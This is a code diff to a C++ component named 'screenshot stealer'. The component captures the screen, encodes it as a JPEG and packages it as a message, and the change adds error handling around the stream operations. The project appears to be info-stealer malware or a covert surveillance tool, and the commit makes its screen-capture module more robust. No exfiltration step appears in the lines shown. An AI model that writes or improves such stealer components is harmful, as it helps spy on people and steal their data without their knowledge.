@@ -43,10 +43,8 @@ asio::awaitable<std::unique_ptr<message_t>> srceenshot_stealer_t::steal()
                 std::string data;
                 {
                     CComPtr<IStream> stream = nullptr;
-                    if(const auto result = CreateStreamOnHGlobal(nullptr, true, &stream);
-                        result == E_INVALIDARG || result == E_OUTOFMEMORY)
+                    if(S_OK != CreateStreamOnHGlobal(nullptr, true, &stream))
                     {
-                        DLOG("Screenshot(ERROR): Cant create stream");
                         std::move(completion_handler)(
                             std::make_unique<error_message_t>("Screenshot(ERROR): Cant create stream"));
                         return;
@@ -57,12 +55,27 @@ asio::awaitable<std::unique_ptr<message_t>> srceenshot_stealer_t::steal()
                     image.Save(stream, Gdiplus::ImageFormatJPEG);
 
                     ULARGE_INTEGER data_size;
-                    IStream_Size(stream, &data_size);
+                    if(S_OK != IStream_Size(stream, &data_size))
+                    {
+                        std::move(completion_handler)(
+                            std::make_unique<error_message_t>("Screenshot(ERROR): Cant get size of stream"));
+                        return;
+                    }
                     data.resize(data_size.LowPart, 'A');
 
-                    IStream_Reset(stream);
+                    if(S_OK != IStream_Reset(stream))
+                    {
+                        std::move(completion_handler)(
+                            std::make_unique<error_message_t>("Screenshot(ERROR): Cant reset stream"));
+                        return;
+                    }
 
-                    IStream_Read(stream, data.data(), data.size());
+                    if(S_OK != IStream_Read(stream, data.data(), data.size()))
+                    {
+                        std::move(completion_handler)(
+                            std::make_unique<error_message_t>("Screenshot(ERROR): Cant read stream"));
+                        return;
+                    }
                 }
 
                 auto to_ret = std::make_unique<photo_message_t>();
